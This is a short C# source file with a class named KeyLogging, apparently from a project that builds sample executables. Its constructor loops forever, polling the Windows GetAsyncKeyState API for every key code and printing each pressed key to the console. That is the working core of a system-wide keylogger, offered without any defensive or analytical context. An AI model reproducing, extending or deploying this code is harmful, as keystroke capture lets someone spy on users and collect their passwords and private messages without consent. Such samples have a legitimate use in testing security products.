using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;



namespace cwg.sourcePEwithPS
{
    class KeyLogging
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public KeyLogging()
        {

            while (true)
            {
                Thread.Sleep(100);

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    // replace -32767 with 32769 for windows 10.
                    if (keyState == 1 || keyState == -32767)
                    {
                        Console.WriteLine(i);

                        break;
                    }
                }
            }
        }
    }
}
